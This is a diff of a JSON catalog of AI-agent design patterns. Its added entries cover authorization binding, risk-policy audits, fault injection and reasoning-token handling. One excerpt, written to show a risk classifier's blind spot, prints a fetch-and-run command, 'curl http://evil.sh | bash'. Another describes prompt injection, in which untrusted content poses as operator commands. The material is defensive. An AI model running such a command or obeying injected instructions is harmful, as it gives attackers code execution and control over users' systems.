@@ -125,7 +125,7 @@
     "summary": "Prevents agents from wasting tokens and time on repeatedly failing tools by tracking failure rates and temporarily disabling broken tool endpoints",
     "maturity": "maturing",
     "complexity": "medium",
-    "effort": "low",
+    "effort": "hours",
     "impact": "high",
     "signals": [
       "Agent calls external APIs or tools that can fail",
@@ -576,6 +576,61 @@
     "excerpt": "\n## Problem\nSynchronous execution of coding tasks—where the agent must wait for compilation, testing, linting, or static analysis—creates **compute bubbles** and **idle resources**. When a coding agent issues a tool call (e.g., `run_tests()`), it blocks further reasoning until that tool returns, leading to underutilized GPUs/TPUs and slower RL rollouts.\n\n- RL agents must push hard on **async RL** \"so everything is happening in parallel without blowing up bubbles\".\n- For coding agents, each I/O-bound tool call (compilation, test runs) can take seconds to minutes.\n- Industry benchmarks show **67% performance improvement** with parallel execution (3.2s vs 9.8s for 3 agents)."
   },
   {
+    "title": "Authenticated Authority Channel",
+    "status": "emerging",
+    "authors": [
+      "Austin Bell (@robertaustinbell)"
+    ],
+    "based_on": [
+      "CaMeL control/data-flow separation",
+      "Design Patterns for Securing LLM Agents against Prompt Injections"
+    ],
+    "category": "Security & Safety",
+    "source": "https://arxiv.org/abs/2503.18813",
+    "tags": [
+      "prompt-injection",
+      "authorization",
+      "provenance",
+      "control-plane",
+      "tool-use"
+    ],
+    "slug": "authenticated-authority-channel",
+    "id": "authenticated-authority-channel",
+    "summary": "Preserve a distinguishable channel for authenticated intent so retrieved content can inform reasoning without granting itself authority.",
+    "maturity": "early",
+    "complexity": "medium",
+    "effort": "days",
+    "impact": "medium",
+    "signals": [
+      "Agents reason over web pages, files, messages, or tool output while retaining consequential tools",
+      "Context is summarized, compacted, delegated, or persisted across execution steps",
+      "A source can contain imperative language that resembles an operator command"
+    ],
+    "anti_signals": [
+      "The agent is read-only and cannot access sensitive data, mutate state, or communicate externally",
+      "A finite action-selector can exclude untrusted content from the control loop entirely"
+    ],
+    "prerequisites": [
+      "An authenticated source for current operator intent",
+      "Runtime-enforced permissions and an execution validation point",
+      "Provenance labels that survive context construction and handoffs"
+    ],
+    "related": [
+      "action-selector-pattern",
+      "policy-gated-tool-proxy",
+      "context-minimization-pattern",
+      "sandboxed-tool-authorization",
+      "lethal-trifecta-threat-model"
+    ],
+    "domains": [
+      "ops",
+      "research",
+      "coding"
+    ],
+    "updated_at": "2026-08-08",
+    "excerpt": "\n## Problem\nTool-using agents often place operator instructions, standing policy, retrieved documents, webpages, messages, tool output, summaries, and delegated reports in the same model context. Untrusted content can then contain imperative language that resembles a legitimate command. If the runtime does not preserve where each instruction-like statement came from, source content can be mistaken for authorization, persisted as policy, or used to redirect a consequential action.\n\nThis is broader than deciding whether a passage is malicious. A benign document can describe a real procedure without authorizing the agent to perform it. The missing distinction is between information that may influence reasoning and input that may grant authority."
+  },
+  {
     "title": "Autonomous Workflow Agent Architecture",
     "status": "established",
     "authors": [
@@ -672,7 +727,7 @@
     "id": "board-mediated-async-inter-agent-coordination",
     "summary": "Route messages between agents through board card comment threads.  A routing prefix triggers inbox card creation for notification; the actual coordination dialogue happens on the work card itself, co-locating decision context with the work that generated it.",
     "complexity": "medium",
-    "effort": "medium",
+    "effort": "days",
     "impact": "high",
     "related": [
       "cross-cycle-consensus-relay",
@@ -1007,7 +1062,7 @@
     "summary": "Records agent promises and credits retrieved memory only after an externally verifiable outcome settles.",
     "maturity": "early",
     "complexity": "medium",
-    "effort": "medium",
+    "effort": "days",
     "impact": "high",
     "signals": [
       "Multi-step agent work",
@@ -1095,6 +1150,61 @@
     "summary": "When an AI agent decides to use multiple tools in a single reasoning step, executing them strictly sequentially can lead to significant delays, especially if many tools are read only and could be run concurrently.",
     "updated_at": "2026-03-11",
     "excerpt": "\n## Problem\nWhen an AI agent decides to use multiple tools in a single reasoning step, executing them strictly sequentially can lead to significant delays, especially if many tools are read-only and could be run concurrently. Conversely, executing all tools in parallel without consideration can cause race conditions, data corruption, or unpredictable behavior if some tools modify state (e.g., write to files, change system settings)."
+  },
+  {
+    "title": "Consequence-Family Coverage Audit",
+    "status": "emerging",
+    "authors": [
+      "Tulip Labs (@fede-kamel)"
+    ],
+    "based_on": [
+      "Tulip Labs (Policy blindness, 2026)"
+    ],
+    "category": "Security & Safety",
+    "source": "https://tulipagents.ai/research/policy-blindness/",
+    "tags": [
+      "risk-classification",
+      "policy-authoring",
+      "coverage-testing",
+      "admission-control",
+      "blind-spots"
+    ],
+    "slug": "consequence-family-coverage-audit",
+    "id": "consequence-family-coverage-audit",
+    "summary": "Audit an agent's risk policy by enumerating families of consequence and asking which rule covers each, because a hand-written risk list reliably encodes one family and stays silent on the rest",
+    "maturity": "early",
+    "complexity": "low",
+    "effort": "hours",
+    "impact": "high",
+    "signals": [
+      "Agent has tools that can spend money, run code, move data, or message real people",
+      "Risk rules are a keyword list or a set of tool names",
+      "The policy was validated against the tool catalog and passed"
+    ],
+    "anti_signals": [
+      "Agent is read-only",
+      "Every tool call already requires human approval"
+    ],
+    "prerequisites": [
+      "An enumerable tool catalog",
+      "A risk classifier or policy to audit"
+    ],
+    "related": [
+      "policy-gated-tool-proxy",
+      "human-in-loop-approval-framework",
+      "sandboxed-tool-authorization"
+    ],
+    "tools": [
+      "policy-engines",
+      "tool-registries"
+    ],
+    "domains": [
+      "ops",
+      "security",
+      "fintech"
+    ],
+    "updated_at": "2026-08-13",
+    "excerpt": "\n## Problem\nAn agent gate has two halves. There is an **enforcement point** that decides\nallow / hold / deny and refuses to run anything else — see\n[policy-gated-tool-proxy](policy-gated-tool-proxy.md) — and there is a\n**classifier** that decides what kind of thing is being proposed. The\nenforcement point is deterministic, small, and exhaustively testable. Everyone\nreviews it, because it looks like security.\n\nThe classifier is usually a list of strings, and that list has a failure mode\nthat survives review: **it describes one family of consequence and says nothing\nabout the others.**\n\nThe failure is not carelessness. Every entry on the list is correct. The list\nis simply written from inside one idea of harm — and from inside that frame,\nthe missing families are invisible.\n\nThree real gates, each reviewed, tested, and validated against the live tool\ncatalog:\n\n| gate over | the list covered | it was silent on |\n|---|---|---|\n| a payments API | money **out** — refund, cancel, dispute, delete | money **in** — creating a charge, standing up a payment page |\n| a DFIR/EDR query tool | **destruction** — quarantine, kill, wipe, uninstall | **execution and exfiltration** |\n| a billing API | **money movement** | **outbound communication** |\n\nThe second is the instructive one. Fourteen markers, all destruction verbs. A\ngate that correctly held `Windows.Remediation.Quarantine` let this through as a\nbenign read:\n\n```sql\nSELECT * FROM execve(argv=[\"bash\",\"-c\",\"curl http://evil.sh | bash\"])\n```\n\nNobody decided arbitrary code execution on a fleet endpoint was acceptable.\nRunning a command destroys nothing, so no destruction verb matched.\n\n**Validating against the real tool catalog does not catch this.** You score the\ncatalog against a ground truth you also wrote, from the same mental model that\nproduced the list. The labels agree with the classifier because both encode the\nsame idea of harm. One of the gates above scored 62/62 on a catalog pulled live\nfrom the real API, twice, across six rounds of hardening — while \"create a\ncharge\" was classified low-risk the entire time."
   },
   {
     "title": "Context Budget as a Governed Resource",
@@ -1292,6 +1402,32 @@
     "summary": "Autonomous multi agent loops that run across many cycles (minutes, hours, or days) need a way to reliably transfer context, decisions, and next actions between cycles.",
     "updated_at": "2026-03-11",
     "excerpt": "\n## Problem\nAutonomous multi-agent loops that run across many cycles (minutes, hours, or days) need a way to reliably transfer context, decisions, and next actions between cycles. In-memory state is lost on crash or restart. Generic checkpoint files don't encode the *structured reasoning* — what was decided, why, and what comes next — that agents need to make good decisions in subsequent cycles.\n\nWithout a structured relay mechanism, autonomous loops suffer from:\n- **Drift**: each cycle restarts without awareness of prior decisions\n- **Repetition**: agents re-debate already-settled questions\n- **Stalls**: no convergence signal — agents loop indefinitely without shipping"
+  },
+  {
+    "title": "Cross-Domain Agent Conflict Resolution",
+    "status": "emerging",
+    "authors": [
+      "Narasimhan Ramani (@Narasimhan-Ramani)"
+    ],
+    "based_on": [
+      "Open Policy Agent policy-as-code",
+      "Multi-objective decision analysis"
+    ],
+    "category": "Orchestration & Control",
+    "source": "https://github.com/open-policy-agent/opa",
+    "tags": [
+      "multi-agent",
+      "conflict-resolution",
+      "policy-as-code",
+      "governance",
+      "orchestration",
+      "drift-detection"
+    ],
+    "slug": "cross-domain-agent-conflict-resolution",
+    "id": "cross-domain-agent-conflict-resolution",
+    "summary": "A coordination layer that cross-references recommendations from independent domain agents, detects conflicts on shared resources, and resolves them through policy-as-code.",
+    "updated_at": "2026-08-21",
+    "excerpt": "\n## Problem\nTeams increasingly run several independent, domain-specific agents against the\nsame environment or dataset — e.g., a cost-optimization agent, a reliability\nagent, a compliance agent, and a performance agent all assessing the same\ncloud infrastructure. Each agent is individually competent within its domain,\nbut none of them are aware the others exist.\n\nThis produces silent, unresolved conflicts: one agent recommends deallocating\nan idle resource to save cost, while another recommends adding redundancy to\nthe same resource for reliability, and a third recommends scaling it up for\nperformance. If recommendations are acted on independently (e.g., via\nauto-remediation), the result is thrashing, wasted work, or actively harmful\nchanges — with no record of *why* the conflict happened or *which*\nrecommendation should have won."
   },
   {
     "title": "Cross-Protocol Agent Discovery",
@@ -1527,7 +1663,7 @@
     "summary": "Track repeated tool denials and auto-escalate to blanket permission prompts or fallback strategies, preventing wasted iterations in non-interactive contexts.",
     "maturity": "maturing",
     "complexity": "low",
-    "effort": "low",
+    "effort": "hours",
     "impact": "high",
     "signals": [
       "Agent runs in non-interactive or background mode",
@@ -1554,6 +1690,40 @@
     ],
     "updated_at": "2026-04-03",
     "excerpt": "\n## Problem\nWhen agents run in non-interactive contexts (background jobs, CI/CD pipelines, headless mode), every permission prompt is typically auto-denied. If the agent keeps attempting the same blocked tool, it wastes its iteration budget retrying an action that will never succeed. This leads to silent failures, stalled tasks, and burned compute with no progress.\n\nEven in interactive mode, a user who repeatedly denies a specific tool creates the same loop: the agent tries, gets denied, tries again with a slightly different argument, and gets denied again."
+  },
+  {
+    "title": "Deterministic Grader in the Loop",
+    "status": "emerging",
+    "authors": [
+      "parweb (@parweb)"
+    ],
+    "category": "Feedback Loops",
+    "source": "https://github.com/parweb/mcp-ai-slop-checker",
+    "tags": [
+      "feedback-loop",
+      "self-critique",
+      "evaluation",
+      "determinism",
+      "llm-as-judge",
+      "reproducibility"
+    ],
+    "slug": "deterministic-grader-in-the-loop",
+    "id": "deterministic-grader-in-the-loop",
+    "summary": "Replace the LLM-as-judge in an agent's self-review loop with a deterministic scorer that returns the raw counts behind each sub-score, so the agent has something specific to fix.",
+    "complexity": "low",
+    "effort": "hours",
+    "impact": "medium",
+    "signals": [
+      "The agent must judge a quality attribute of its own output before shipping it",
+      "You want the same input to always produce the same verdict",
+      "You want the verdict to be assertable in a test or CI gate"
+    ],
+    "anti_signals": [
+      "The quality attribute genuinely requires semantic judgement (factual correctness, tone-for-this-audience)",
+      "You have no way to enumerate observable features of 'good'"
+    ],
+    "updated_at": "2026-08-21",
+    "excerpt": "\n## Problem\nAn agent that produces text is routinely asked to judge that text before shipping it: *is this argument sound, is this copy generic, does this read as machine-written?* The default move is to ask a model — LLM-as-judge, or an off-the-shelf classifier.\n\nBoth fail the agent in the same specific way: **the verdict is not actionable and not reproducible.**\n\n- A classifier returns `87% likely AI-generated`. There is no next move encoded in that number. The agent's only recourse is to rewrite blindly and re-roll.\n- An LLM judge returns a different score for the same input across runs, and drifts with model versions, so it cannot gate a pipeline or be asserted in a test.\n- Both make an *authorship* claim from *style* evidence, and are wrong in both directions.\n\nThe loop stalls because the feedback has no gradient."
   },
   {
     "title": "Deterministic Security Scanning Build Loop",
@@ -1781,6 +1951,34 @@
     "excerpt": "\n## Problem\nWhen the same model both reads untrusted content and controls high-privilege tools, a single prompt-injection path can convert benign context into privileged actions. This coupling collapses trust boundaries and makes it hard to reason about where dangerous behavior originated."
   },
   {
+    "title": "Dual-Rail Message Delivery",
+    "status": "validated-in-production",
+    "authors": [
+      "Anton Dziatkovskii (@Palo-Alto-AI-Research-Lab)"
+    ],
+    "based_on": [
+      "Chandra & Toueg (1996), unreliable failure detectors",
+      "Helland (2012), at-least-once delivery and idempotence"
+    ],
+    "category": "Orchestration & Control",
+    "source": "https://www.cs.utexas.edu/~lorenzo/corsi/cs380d/papers/p225-chandra.pdf",
+    "tags": [
+      "multi-agent",
+      "coordination",
+      "message-bus",
+      "reliability",
+      "redundancy",
+      "fault-detection",
+      "human-in-the-loop",
+      "distributed-systems"
+    ],
+    "slug": "dual-rail-message-delivery",
+    "id": "dual-rail-message-delivery",
+    "summary": "Agents running on separate machines coordinate over a single channel: a synced folder, a queue, or a chat.",
+    "updated_at": "2026-08-21",
+    "excerpt": "\n## Problem\nAgents running on separate machines coordinate over a single channel: a synced folder, a queue, or a chat. That channel eventually fails, and it fails *quietly*.\n\nThe damage is not the outage itself, it is the ambiguity it creates. A dead channel and an idle channel produce exactly the same observation: nothing arrives. The sender's log says \"sent\" and stops there. The receiver has nothing to report, because it never learned a message existed. No exception is raised, no retry fires, and the fleet keeps behaving as if silence meant agreement. Outages are typically discovered hours later, by a human noticing that something downstream never happened.\n\nTwo properties make this failure mode expensive:\n\n1. **\"Sent\" is not \"delivered\", and \"delivered\" is not \"done\"** — but a single channel collapses all three into one unobservable event.\n2. **Machine-to-machine traffic is invisible to humans**, so the people who could intervene are the last to find out.\n\nRetries do not fix this. Retrying on a dead rail produces more silence.\n\nThis is the practical face of a classical result: in an asynchronous system you cannot distinguish a crashed participant from a slow one by observing messages alone (Chandra & Toueg, 1996). A second, independently failing channel supplies another observation. When a message appears on one rail but not the other, that divergence localizes a rail failure. When neither rail delivers or acknowledges a message, silence is still ambiguous: the peer may be slow or unavailable, or both rails may have failed. Timeouts and escalation remain necessary for that case."
+  },
+  {
     "title": "Dual-Use Tool Design",
     "status": "best-practice",
     "authors": [
@@ -1926,6 +2124,86 @@
     "summary": "Stateless request handling causes agents to repeatedly rediscover decisions, constraints, and prior failures.",
     "updated_at": "2026-03-11",
     "excerpt": "\n## Problem\nStateless request handling causes agents to repeatedly rediscover decisions, constraints, and prior failures. Over multi-session workflows this leads to redundant work, inconsistent behavior, and shallow planning because each turn lacks durable historical context."
+  },
+  {
+    "title": "Evidence-Layered Evaluation for Interactive Agents",
+    "status": "emerging",
+    "authors": [
+      "Yuxuan Zhang (@reacher-z)"
+    ],
+    "based_on": [
+      "BrowserGym contributors",
+      "WebArena contributors"
+    ],
+    "category": "Reliability & Eval",
+    "source": "https://github.com/TIGER-AI-Lab/ClawBench",
+    "tags": [
+      "evaluation",
+      "browser-agents",
+      "computer-use",
+      "reproducibility",
+      "observability"
+    ],
+    "slug": "evidence-layered-evaluation-for-interactive-agents",
+    "id": "evidence-layered-evaluation-for-interactive-agents",
+    "summary": "Interactive agents can reach the wrong outcome for many different reasons: a bad plan, an incorrect click, a transient site response, or an evaluator that cannot observe the relevant state.",
+    "updated_at": "2026-08-21",
+    "excerpt": "\n## Problem\nInteractive agents can reach the wrong outcome for many different reasons: a bad plan, an incorrect click, a transient site response, or an evaluator that cannot observe the relevant state. A single success/failure score hides these causes and makes regressions difficult to reproduce, especially when tasks run on live websites or desktop applications."
+  },
+  {
+    "title": "Exact-Action Authorization Binding",
+    "status": "proposed",
+    "authors": [
+      "Austin Bell (@robertaustinbell)"
+    ],
+    "based_on": [
+      "NOA Action Digest",
+      "TOCTOU-safe authorization design"
+    ],
+    "category": "Security & Safety",
+    "source": "https://datatracker.ietf.org/doc/html/draft-toraman-noa-action-digest-01",
+    "tags": [
+      "authorization",
+      "approval",
+      "tool-use",
+      "action-binding",
+      "TOCTOU",
+      "receipts"
+    ],
+    "slug": "exact-action-authorization-binding",
+    "id": "exact-action-authorization-binding",
+    "summary": "Bind a short-lived approval to the complete action presented to the reviewer, then rederive and compare that identity at the acting boundary before execution.",
+    "maturity": "early",
+    "complexity": "medium",
+    "effort": "days",
+    "impact": "high",
+    "signals": [
+      "A human or policy service approves consequential agent actions before execution",
+      "Approved targets, arguments, identities, or policies can change while an action is queued",
+      "Approval and execution occur in different processes, services, or agent turns"
+    ],
+    "anti_signals": [
+      "The action is read-only, low consequence, and cannot affect sensitive data or external state",
+      "Approval and execution are one indivisible operation over immutable arguments"
+    ],
+    "prerequisites": [
+      "An acting adapter that mediates every governed execution path",
+      "A deterministic canonical representation of authorization-relevant fields",
+      "An authenticated authorization envelope and bounded validity period"
+    ],
+    "related": [
+      "authenticated-authority-channel",
+      "human-in-loop-approval-framework",
+      "policy-gated-tool-proxy",
+      "cryptographic-governance-audit-trail"
+    ],
+    "domains": [
+      "ops",
+      "coding",
+      "fintech"
+    ],
+    "updated_at": "2026-08-21",
+    "excerpt": "\n## Problem\nApproval systems often ask a person or policy service to approve a proposed tool call, then execute it later. Between those steps, the request can be reconstructed, transformed, retried, delegated, or resumed from stored state. A seemingly valid approval may therefore be applied to a materially different action: another recipient, target, operation, payload, actor, acting surface, or policy version.\n\nOrdinary audit logs show what was approved and what was executed, but comparison after the fact does not prevent the mismatch. Tool-level allowlists and human approval gates decide whether an action may proceed; unless the acting boundary verifies the exact approved action, they do not close this approval-to-execution time-of-check/time-of-use gap.\n\nThis is narrower than deciding where approval is required or which policy allows a tool call. It binds one authenticated approval to the authorization-relevant representation that a correctly mediated adapter will consume."
   },
   {
     "title": "Explicit Posterior-Sampling Planner",
@@ -2099,6 +2377,32 @@
     "summary": "Agents persist intermediate results and working state to files, creating durable checkpoints that enable workflow resumption, recovery from failures, and support for long-running tasks.",
     "updated_at": "2026-01-05",
     "excerpt": "\n## Problem\nMany agent workflows are long-running or may be interrupted (by errors, timeouts, or user intervention). Keeping all intermediate state in the model's context window is fragile and doesn't persist across sessions. When failures occur or when agents hit context limits, work is lost and must restart from scratch."
+  },
+  {
+    "title": "Filesystem-Mediated Host Delegation",
+    "status": "emerging",
+    "authors": [
+      "Abhinay Krupa (@abhinaykrupa)"
+    ],
+    "based_on": [
+      "Maildir-style spool directories",
+      "Claude Code / Cowork sandbox split"
+    ],
+    "category": "Tool Use & Environment",
+    "source": "https://github.com/abhinaykrupa/cowork-to-code-bridge",
+    "tags": [
+      "sandbox-escape",
+      "host-execution",
+      "async-rpc",
+      "idempotency",
+      "spool-directory",
+      "durability"
+    ],
+    "slug": "filesystem-mediated-host-delegation",
+    "id": "filesystem-mediated-host-delegation",
+    "summary": "An agent that runs inside a sandbox — a container, a hosted runtime, a cloud workspace — is deliberately cut off from the developer's real machine.",
+    "updated_at": "2026-08-21",
+    "excerpt": "\n## Problem\nAn agent that runs inside a sandbox — a container, a hosted runtime, a cloud\nworkspace — is deliberately cut off from the developer's real machine. That\nisolation is correct for safety, but it puts the most valuable work out of\nreach: the toolchain, the local filesystem, git credentials, the Docker daemon,\nand the half-configured services that only exist on someone's laptop.\n\nThe obvious fixes are worse than the problem:\n\n- **Open a port on the host.** Now the developer's machine exposes another\n  network service that must be authenticated, authorized, and reachable through\n  NAT or a corporate VPN.\n- **Hold a synchronous connection.** Sandboxes get suspended, hit request\n  timeouts, and are reaped. A 20-minute build outlives the caller, and when the\n  caller dies mid-flight the work is orphaned with no way to reclaim the result.\n- **Re-issue the call on reconnect.** Without a durable identity for the\n  request, a retry after a dropped connection re-runs a deploy or a migration\n  a second time.\n\nThe underlying difficulty is that the two sides have *different lifetimes*. The\nsandbox is ephemeral and may vanish mid-task; the host is long-lived. Any\nmechanism that assumes both endpoints stay alive for the duration of the work\nwill drop tasks."
   },
   {
     "title": "Frontier-Focused Development",
@@ -2683,7 +2987,7 @@
     "id": "local-first-credential-broker",
     "summary": "Keep raw secrets out of the agent process by injecting credentials at the network layer through a local broker, rather than handing the agent environment variables or config files.",
     "complexity": "medium",
-    "effort": "medium",
+    "effort": "days",
     "impact": "high",
     "signals": [
       "Agents call multiple authenticated SaaS APIs in one run",
@@ -2726,7 +3030,7 @@
     "summary": "When agents from different vendors (Claude Code, Codex, Gemini CLI, Cursor, local Ollama, etc.) work on the same long lived project, they have no native channel for \"who's good at what,\" \"what did we already try,\" or \"what does this team consider done.\" Each session starts cold.",
     "maturity": "maturing",
     "complexity": "medium",
-    "effort": "medium",
+    "effort": "days",
     "impact": "high",
     "signals": [
       "Multiple agents from different vendors need to share state on the same project",
@@ -3079,7 +3383,7 @@
     "summary": "Score an orchestrator LLM on whether it assigns the right information fragments to the right sub-agent roles and writes correct sub-agent prompts, independent of whether the downstream task happens to succeed anyway.",
     "maturity": "early",
     "complexity": "medium",
-    "effort": "medium",
+    "effort": "days",
     "impact": "medium",
     "signals": [
       "Building a multi-agent system with a fixed or evolving communication topology",
@@ -3126,7 +3430,7 @@
     "id": "output-verification-loop",
     "summary": "Verify LLM outputs by extracting individual claims, checking each against evidence sources, and returning per-claim trust scores before acting on the result.",
     "complexity": "low",
-    "effort": "low",
+    "effort": "hours",
     "impact": "high",
     "signals": [
       "Agent output feeds into decisions or downstream agents",
@@ -3143,6 +3447,59 @@
     ],
     "updated_at": "2026-07-23",
     "excerpt": "\n## Problem\nLLM agents confidently produce outputs that contain factual errors, hallucinated citations, or unsupported claims. In multi-agent pipelines the problem compounds: one agent's hallucination becomes another agent's input. Standard reflection loops catch stylistic issues but lack grounding against external evidence, so factual errors pass through unchallenged."
+  },
+  {
+    "title": "Own-Check Fault Injection",
+    "status": "emerging",
+    "authors": [
+      "Jeff Otterson (@Jott2121)"
+    ],
+    "based_on": [
+      "Jia et al. (MAS-FIRE, arXiv:2602.19843)",
+      "Bhardwaj (AgentAssay, arXiv:2603.02601)"
+    ],
+    "category": "Reliability & Eval",
+    "source": "https://github.com/Jott2121/sabot",
+    "tags": [
+      "fault-injection",
+      "evals",
+      "reliability",
+      "self-verification",
+      "guardrails",
+      "chaos-engineering",
+      "observability"
+    ],
+    "slug": "own-check-fault-injection",
+    "id": "own-check-fault-injection",
+    "summary": "Plant a controlled fault inside a running agent pipeline and score whether the pipeline's own checks emit a detection act, keeping detected, reacted and recovered as separate verdicts.",
+    "maturity": "early",
+    "complexity": "medium",
+    "effort": "days",
+    "impact": "high",
+    "signals": [
+      "You ship reviewer agents, critic stages or guardrail callbacks and treat them as your reliability story",
+      "You want assurance evidence stronger than \"our end-to-end pass rate is high\"",
+      "You are about to let an agent take a side effect that is expensive to undo"
+    ],
+    "anti_signals": [
+      "Single-turn prompt pipelines with no internal verification stage to measure",
+      "You only need capability benchmarking, not reliability under injected failure"
+    ],
+    "prerequisites": [
+      "A deterministic pass criterion for the task, so a no-fault baseline can be established",
+      "Trace or event capture at the seam where each check runs"
+    ],
+    "tools": [
+      "eval-harness",
+      "tracing"
+    ],
+    "domains": [
+      "ops",
+      "coding",
+      "research"
+    ],
+    "updated_at": "2026-08-21",
+    "excerpt": "\n## Problem\nMulti-agent pipelines increasingly gate real work behind their own quality machinery:\nreviewer agents, deterministic guardrail callbacks, escalation interrupts, orchestrator\nprogress ledgers. That machinery underwrites a widespread operational assumption — *if\nsomething goes wrong mid-pipeline, some check will catch it.*\n\nThe assumption is rarely tested, because the usual evidence for it is the wrong\nmeasurement. End-to-end pass rate tells you the pipeline produced a good answer. It does\nnot tell you whether anything would have noticed a bad input. Those come apart badly: a\npipeline can absorb a corrupted tool result, silently route around it, and still emit a\ncorrect answer. Every dashboard stays green, and you have learned nothing about the case\nyour pipeline *cannot* absorb.\n\nWorse, capability benchmarks and external monitors both miss the question. A benchmark\nasks whether the agent is smart. An external monitor asks whether *you* can detect a\nproblem from outside. Neither asks whether the self-verification you already paid for\nactually fires."
   },
   {
     "title": "Parallel Tool Call Learning",
@@ -3192,6 +3549,62 @@
     "summary": "Coding agents with access to multiple patching or refactoring tools (e.g., text based apply patch , AST based refactoring, semantic migration) may choose suboptimal tools if not explicitly guided.",
     "updated_at": "2026-03-11",
     "excerpt": "\n## Problem\nCoding agents with access to multiple patching or refactoring tools (e.g., text-based `apply_patch`, AST-based refactoring, semantic migration) may choose suboptimal tools if not explicitly guided. This leads to:\n\n- **Unnecessary Complexity:** Agent might use a generic text-replace tool instead of a specialized AST-aware refactoring tool.\n- **Inconsistent Results:** Without explicit instructions, the agent's tool selection can vary unpredictably, hampering reproducibility.\n- **Safety Risks:** Text-based patching on refactoring tasks can break imports, miss references, or introduce syntax errors."
+  },
+  {
+    "title": "Persistent Test Memory Feedback Loop",
+    "status": "emerging",
+    "authors": [
+      "Pranshu Chittora (@pranshuchittora)"
+    ],
+    "based_on": [
+      "Vostride Agent QA (contributor-affiliated implementation)",
+      "Shinn et al. (Reflexion)"
+    ],
+    "category": "Learning & Adaptation",
+    "source": "https://github.com/vostride/agent-qa",
+    "tags": [
+      "testing-agents",
+      "persistent-memory",
+      "feedback-loop",
+      "self-healing",
+      "regression-testing"
+    ],
+    "slug": "persistent-test-memory-feedback-loop",
+    "id": "persistent-test-memory-feedback-loop",
+    "summary": "Preserve validated test lessons so an agent can reuse successful paths, recognize recurring failures, and retire stale knowledge.",
+    "maturity": "early",
+    "complexity": "medium",
+    "effort": "days",
+    "impact": "medium",
+    "signals": [
+      "Repeated user-flow tests against an evolving interface",
+      "The agent repeatedly rediscovers the same navigation or failure cause"
+    ],
+    "anti_signals": [
+      "Stateless one-off checks",
+      "Tests whose state or evidence cannot be stored safely"
+    ],
+    "prerequisites": [
+      "A stable scope key for application and environment",
+      "Structured run evidence and a pass/fail oracle"
+    ],
+    "related": [
+      "memory-synthesis-from-execution-logs",
+      "rich-feedback-loops",
+      "workflow-evals-with-mocked-tools"
+    ],
+    "tools": [
+      "test-runner",
+      "memory-store",
+      "evidence-recorder"
+    ],
+    "domains": [
+      "software-testing",
+      "web",
+      "mobile"
+    ],
+    "updated_at": "2026-08-16",
+    "excerpt": "\n## Problem\nAn agent that executes end-to-end tests without durable memory starts each run from\nscratch. It repeatedly rediscovers navigation paths, semantic landmarks, and known\nfailure causes. When an interface changes, brittle replay can fail even though the\nuser intent is unchanged.\n\nSaving every trace is not enough. Raw traces contain transient state, sensitive\nvalues, and accidental successes. Replaying them uncritically turns old evidence\ninto a new source of test flakiness."
   },
   {
     "title": "PII Tokenization",
@@ -3465,6 +3878,46 @@
     "excerpt": "\n## Problem\nLong-running agent conversations with many tool calls can suffer from **quadratic performance degradation**:\n\n- **Growing JSON payloads**: Each iteration sends the entire conversation history to the API\n- **Expensive re-computation**: Without caching, the model re-processes the same static content repeatedly\n- **ZDR constraints**: Zero Data Retention (ZDR) policies prevent server-side state, ruling out `previous_response_id` optimization\n- **Configuration changes**: Mid-conversation changes (sandbox, tools, working directory) can break cache efficiency\n\nAs conversations grow, inference costs and latency increase quadratically without proper caching strategies."
   },
   {
+    "title": "Reasoning-Token Firewall",
+    "status": "validated-in-production",
+    "authors": [
+      "aaronjmars (@aaronjmars)"
+    ],
+    "based_on": [
+      "Aeon harness-adapter (aeonfun/aeon)"
+    ],
+    "category": "Reliability & Eval",
+    "source": "https://github.com/aeonfun/aeon/tree/main/harness-adapter",
+    "tags": [
+      "reasoning",
+      "chain-of-thought",
+      "streaming",
+      "output-hygiene",
+      "safety",
+      "harness"
+    ],
+    "slug": "reasoning-token-firewall",
+    "id": "reasoning-token-firewall",
+    "summary": "Assemble an agent's result only from answer-typed stream events, never by string-stripping interleaved reasoning tokens.",
+    "complexity": "low",
+    "effort": "hours",
+    "impact": "high",
+    "signals": [
+      "The harness streams reasoning and answer tokens in one response",
+      "The agent's output is committed, stored in memory, or forwarded to users or other agents"
+    ],
+    "anti_signals": [
+      "The model returns a single non-streamed answer with no separate reasoning channel"
+    ],
+    "related": [
+      "chain-of-thought-monitoring-interruption",
+      "verbose-reasoning-transparency",
+      "structured-output-specification"
+    ],
+    "updated_at": "2026-08-11",
+    "excerpt": "\n## Problem\nReasoning models emit two kinds of tokens in one response: private chain-of-thought and the final answer. When a harness builds its \"result\" from the whole stream and then tries to remove the reasoning afterward with string heuristics, it eventually leaks. Reasoning has no stable delimiter, the shape differs per model and per version, and a single missed case commits raw chain-of-thought into a file, a memory store, a notification, or the context of the next agent in the chain.\n\nThat leak is not just cosmetic. Chain-of-thought routinely contains half-formed conclusions, discarded plans, and sensitive scratch data. Once it lands in a durable artifact it is indistinguishable from the intended answer, it inflates memory and context, and it can surface content the model never meant to publish."
+  },
+  {
     "title": "Recursive Best-of-N Delegation",
     "status": "emerging",
     "authors": [
@@ -3542,6 +3995,48 @@
     "summary": "RAG pipelines and agent systems often fail in ways that are hard to diagnose: missing context, unstable retrieval, brittle tool contracts, and flaky behavior after data updates.",
     "updated_at": "2026-03-11",
     "excerpt": "\n## Problem\nRAG pipelines and agent systems often fail in ways that are hard to diagnose: missing context, unstable retrieval, brittle tool contracts, and flaky behavior after data updates.\n\nTeams frequently address these failures by iterating on prompts or tuning model settings first, which makes incidents feel random and expensive to fix.\n\nThis pattern addresses the need for a shared, repeatable triage routine that turns vague failures into actionable repair paths. Research shows structured incident data correlates with better reliability outcomes (ACM SIGOPS 2022, IEEE ISSRE 2019)."
+  },
+  {
+    "title": "Rendered UI Finish Gate",
+    "status": "emerging",
+    "authors": [
+      "Samuel Bushi (@samuelbushi)"
+    ],
+    "based_on": [
+      "UIZZE anti-ui-slop workflow (UIZZE)"
+    ],
+    "category": "Feedback Loops",
+    "source": "https://github.com/uizze/uizze/tree/main/skills/anti-ui-slop",
+    "tags": [
+      "ui-quality",
+      "frontend",
+      "coding-agents",
+      "verification",
+      "design-systems",
+      "feedback-loops"
+    ],
+    "slug": "rendered-ui-finish-gate",
+    "id": "rendered-ui-finish-gate",
+    "summary": "Verify an agent-built interface against its intended design contract, required states, interaction semantics, and rendered output before merging.",
+    "complexity": "medium",
+    "effort": "hours",
+    "impact": "high",
+    "signals": [
+      "An agent has changed a user-facing interface",
+      "Visual regressions are hard to catch in code review",
+      "The interface has multiple async, empty, error, or responsive states"
+    ],
+    "anti_signals": [
+      "The change is entirely non-visual",
+      "No rendered or interactive output exists to inspect"
+    ],
